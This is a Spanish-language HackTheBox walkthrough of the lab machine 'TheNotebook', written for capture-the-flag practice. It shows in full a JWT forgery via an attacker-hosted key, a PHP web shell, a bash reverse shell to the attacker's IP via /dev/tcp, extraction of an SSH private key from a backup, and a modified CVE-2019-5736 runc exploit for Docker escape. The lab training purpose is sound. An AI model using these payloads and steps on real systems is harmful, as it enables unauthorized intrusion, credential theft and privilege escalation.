# Máquina "TheNotebook" de HackTheBox

## Características

- **Sistema Operativo:** Linux
- **Dificultad:** Medium
- **Tecnologías:** JSON, PHP, NGINX, Docker
- **Tipo:** External, Web
- **Nivel:** Penetration Tester Level 2
- **Vulnerabilidades:**
  - Weak Authentication
  - CVE-2019-5736
  - A06:2021-Vulnerable And Outdated Components
  - A07:2021-Identification And Authentication Failures
  - A05:2021-Security Misconfiguration
  - Information Disclosure
  - Unrestricted File Upload
  - Public Vulnerabilities
  - CVE Exploitation
  - Code Execution
  - Docker Escape
  - Abusing JWT (Gaining privileges)
  - Abusing Upload File Docker Breakout [CVE-2019-5736 - RUNC] (Privilege Escalation)

## Utilidad en certificaciones

- **eWPT**
- **OSCP** (Escalada)
- **OSWE**

**IP:** 10.10.10.230

## Reconocimiento

### Escaneo Nmap

Escaneo inicial de puertos:
```bash
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.230 -oG allPorts
```

**Resultado:**
```
Not shown: 65504 closed ports, 29 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Escaneo detallado de servicios:
```bash
sudo nmap -sCV -p22,80 10.10.10.230 -oN targeted
```

**Resultado:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Análisis de la aplicación web

Al acceder a la sección de login de la página web y al intentar ingresar credenciales, la aplicación nos devuelve si existe o no el usuario, lo que podemos aprovechar como vulnerabilidad para listar usuarios existentes. Luego procedemos a hacer fuzzing:

```bash
sudo wfuzz -c --hh=1333 -t 200 -w /usr/share/SecLists/Passwords/xato-net-10-million-passwords-10000.txt -d 'username=admin&password=FUZZ' http://10.10.10.230/login
```

**Nota:** `--hh=1333` oculta la salida de 1333 caracteres

No obtenemos resultados favorables, así que nos registraremos e iniciaremos sesión.

### Análisis de funcionalidades

Si visitamos `/notas`, veremos que podemos agregar nuestras propias notas y guardarlas. Esto podría ser vulnerable a SSTI (Server-Side Template Injection).

Los motores de plantillas son ampliamente utilizados por las aplicaciones web para presentar datos dinámicos a través de páginas web y correos electrónicos. La incrustación insegura de la entrada del usuario en las plantillas permite la inyección de plantillas del lado del servidor, una vulnerabilidad crítica frecuente que es extremadamente fácil de confundir con Cross-Site Scripting (XSS). A diferencia de XSS, la inyección de plantillas se puede utilizar para atacar directamente las partes internas de los servidores web y, a menudo, obtener la ejecución remota de código (RCE), convirtiendo cada aplicación vulnerable en un punto de pivote potencial.

Para testear inyecciones de código, utilizamos payloads de PayloadAllTheThings filtrados por SSTI. Probamos algunas y no es vulnerable, así que seguimos inspeccionando.

### Análisis de JWT

Copiamos las cookies y tiene pinta de ser un JSON Web Token, así que lo llevamos a la página para analizarlo:

**URL:** https://jwt.io/

![JWT Analysis](/secciones/posts/imagenes/notebook/jswt1.webp)

Los datos muestran mi nombre de usuario y correo electrónico, además de lo que puedo adivinar es una bandera que dice si el usuario es administrador: `admin_cap`. La parte del encabezado muestra que está usando pares de claves asimétricas para firmar y proporciona una URL. En este caso, se accede al puerto localhost 7070 para obtener la clave privada.

### Ataque de suplantación JWT

Como puedo cambiar la información del encabezado en el JWT, intentaré darle un `kid` de mi host en lugar del host local. Un servidor seguro rechazaría cualquier cosa que no esté en el host local (o en algún otro host específicamente incluido en la lista blanca), pero olvidarlo no es un error poco común.

Voy a generar mi propia clave para alojar y luego generaré un JWT que apunte a esa clave, para que luego se valide.

Generación de clave usando OpenSSL:

```bash
openssl genrsa -out privKey.key 2048
```

```
Generating RSA private key, 2048 bit long modulus (2 primes)
.........................................................................+++++
....................................................................+++++
e is 65537 (0x010001)
```

```bash
chmod 666 privKey.key
cat privKey.key | xclip -sel clip
```

Pegamos nuestra key en la segunda sección de key en la página de JWT, en "Verify Signature", y cambiamos el valor de `admin_cap` a `1`. Copiamos la cookie generada para pegarla en auth y montamos un servidor simple con Python:

```bash
python -m http.server 80
```

Recargamos la página y podemos ver una nueva sección que dice "Admin Panel".

![Admin Panel](/secciones/posts/imagenes/notebook/admpanel1.webp)

Si cerramos el servidor y recargamos, se quita la cookie, así que debemos tener el servicio levantado.

Curiosamente, en el enlace de Notas, todavía muestra la nota única asociada con mi UUID. Pero el enlace en el Panel de administración → Ver notas va a `/admin/viewnotes`, donde veo todas las notas en el servidor.

### Información importante en las notas

Hay dos sugerencias en las notas del administrador:

1. Se están ejecutando archivos PHP (a pesar de que este servidor claramente no es PHP)
2. El servidor tiene programadas copias de seguridad periódicas

## Explotación - Upload de archivos

El enlace más interesante es el enlace "Cargar archivo", que conduce a un formulario:

![Upload Form](/secciones/posts/imagenes/notebook/form1.webp)

Primero intenté cargar un archivo de texto sin formato, `test.txt`, y vemos que cambia el nombre del archivo, pero no la extensión. Sin embargo, el enlace "Ver" está roto porque devuelve 404.

Debido a que la nota decía que se estaban ejecutando archivos PHP, subiré un webshell PHP:

```bash
nano cmd.php
```

```php
<?php 
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Aparece con un nombre de archivo hexadecimal largo, pero con la misma extensión. Si agrego `?cmd=id` hasta el final, muestra que tengo ejecución:

![Command Execution](/secciones/posts/imagenes/notebook/exec1.webp)

### Establecimiento de reverse shell

Usaremos curl para activar la web shell:

```bash
curl --data-urlencode 'cmd=id' -G -s http://10.10.10.230/a1ba6293840f8a8fb4d5dda74c98c90a.php
```

**Resultado:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Ponemos netcat en modo escucha y reemplazamos `id` con una carga útil de reverse shell:

```bash
curl --data-urlencode "cmd=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.19/443 0>&1'" -G -s http://10.10.10.230/a1ba6293840f8a8fb4d5dda74c98c90a.php
```

```bash
nc -nlvp 443
```

Y tenemos una shell:

```bash
www-data@thenotebook:~/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Escalada de privilegios

### Reconocimiento del sistema

Buscamos la flag sin poder verla, así que debemos buscar formas de escalar privilegios.

`ifconfig` muestra que estoy en la máquina host (10.10.10.230), pero también que hay una red Docker:

```
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:91:98:d2:78  txqueuelen 0  (Ethernet)
        RX packets 164784  bytes 22121111 (22.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 198504  bytes 16853611 (16.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Revisamos el directorio home:

```bash
www-data@thenotebook:/home$ ls -la noah/
total 36
drwxr-xr-x 5 noah noah 4096 Feb 23 08:57 .
drwxr-xr-x 3 root root 4096 Feb 19 13:49 ..
lrwxrwxrwx 1 root root    9 Feb 17 09:03 .bash_history -> /dev/null
-rw-r--r-- 1 noah noah  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 noah noah 3771 Apr  4  2018 .bashrc
drwx------ 2 noah noah 4096 Feb 19 13:49 .cache
drwx------ 3 noah noah 4096 Feb 19 13:49 .gnupg
-rw-r--r-- 1 noah noah  807 Apr  4  2018 .profile
drwx------ 2 noah noah 4096 Feb 19 13:49 .ssh
lrwxrwxrwx 1 noah noah    9 Feb 23 08:57 .viminfo -> /dev/null
-r-------- 1 noah noah   33 Jul 21 21:21 user.txt
```

`user.txt` está ahí, pero no puedo leerlo como www-data.

### Análisis de backups

Dada la nota sobre copias de seguridad, revisaré `/var/backups`:

```bash
www-data@thenotebook:/var/backups$ ls -l
total 52
-rw-r--r-- 1 root root 33252 Feb 24 08:53 apt.extended_states.0
-rw-r--r-- 1 root root  3609 Feb 23 08:58 apt.extended_states.1.gz
-rw-r--r-- 1 root root  3621 Feb 12 06:52 apt.extended_states.2.gz
-rw-r--r-- 1 root root  4373 Feb 17 09:02 home.tar.gz
```

Todos estos son propiedad de root, pero legibles para todos. `home.tar.gz` podría ser interesante. Enumeremos los archivos dentro:

```bash
www-data@thenotebook:/var/backups$ tar -tvf home.tar.gz
drwxr-xr-x root/root         0 2021-02-12 06:24 home/
drwxr-xr-x noah/noah         0 2021-02-17 09:02 home/noah/
-rw-r--r-- noah/noah       220 2018-04-04 18:30 home/noah/.bash_logout
drwx------ noah/noah         0 2021-02-16 10:47 home/noah/.cache/
-rw-r--r-- noah/noah         0 2021-02-16 10:47 home/noah/.cache/motd.legal-displayed
drwx------ noah/noah         0 2021-02-12 06:25 home/noah/.gnupg/
drwx------ noah/noah         0 2021-02-12 06:25 home/noah/.gnupg/private-keys-v1.d/
-rw-r--r-- noah/noah      3771 2018-04-04 18:30 home/noah/.bashrc
-rw-r--r-- noah/noah       807 2018-04-04 18:30 home/noah/.profile
drwx------ noah/noah         0 2021-02-17 08:59 home/noah/.ssh/
-rw------- noah/noah      1679 2021-02-17 08:59 home/noah/.ssh/id_rsa
-rw-r--r-- noah/noah       398 2021-02-17 08:59 home/noah/.ssh/authorized_keys
-rw-r--r-- noah/noah       398 2021-02-17 08:59 home/noah/.ssh/id_rsa.pub
```

Parece ser el directorio personal de Noah y hay una clave privada en `.ssh`. Leeré la clave del archivo (sin extraerla primero al disco para no ensuciar):

```bash
www-data@thenotebook:/var/backups$ tar xf home.tar.gz -O home/noah/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAyqucvz6P/EEQbdf8cA44GkEjCc3QnAyssED3qq9Pz1LxEN04
HbhhDfFxK+EDWK4ykk0g5MvBQckcxAs31mNnu+UClYLMb4YXGvriwCrtrHo/ulwT
...[snip]...
Uh6he5GM5rTstMjtGN+OQ0Z8UZ6c0HBM0ulkBT9IUIUEdLFntA4oAVQ=
-----END RSA PRIVATE KEY-----
```

### Acceso SSH como Noah

```bash
ssh -i ~/keys/thenotebook_noah noah@10.10.10.230
```

La clave funciona para noah. Buscamos la flag y la podemos leer.

### Análisis de permisos sudo

Noah puede correr docker como root para iniciar un conjunto específico de contenedores:

```bash
noah@thenotebook:~$ sudo -l
Matching Defaults entries for noah on thenotebook:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```

Se puede ver `/usr/bin/docker exec -it webapp-dev01` y pone un `*` al final, podemos ejecutar de todo sobre este docker.

### Identificación de vulnerabilidad Docker

Veamos la versión de docker en ejecución:

```bash
docker -v
Docker version 18.06.0-ce, build 0ffa825
```

Esta versión es vulnerable a **CVE-2019-5736**.

Lanzaremos `exec -it` en docker que es para ejecutar un comando de forma interactiva:

```bash
sudo /usr/bin/docker exec -it webapp-dev01 whoami
```

Somos root dentro del docker.

### Explotación de CVE-2019-5736

Buscamos información sobre el CVE: https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go

Revisamos el código y en la sección `var payload`, después de `bin bash` y salto de línea, agregamos nuestro código:

```bash
chmod u+s /bin/bash
```

El exploit debería quedar de esta forma:

```go
func main() {
    // This is the line of shell commands that will execute on the host
    var payload = "#!/bin/bash \n chmod u+s /bin/bash"
```

Esta escalada es conocida como escalada de privilegios con binario SUID:
https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/

Teniendo los comandos modificados, lo compilamos:

```bash
go build -ldflags "-s -w" main.go
```

Con las flags `-s -w` para reducir el tamaño. Lo mandamos a noah y de noah al docker, y en el docker le damos permisos de ejecución:

```bash
chmod +x exploit
```

Para lanzarlo ejecutamos:

```bash
sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
```

Ahora hacemos:

```bash
ls -l
```

Y debería mostrarnos permisos de ejecución como root. Damos:

```bash
bash -p
```

Y somos root.

## Nota 

Algunos de los writeups en esta página pueden tener contenido de otras páginas o tener muy pocas imágenes, esto debido a que en algunas de las máquinas que realicé, no tomé los apuntes o no tomé capturas de pantalla, así que he decidido buscar varios writeups y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí. También si encuentras faltas de ortografía o cualquier error, puedes contactarme a mi correo.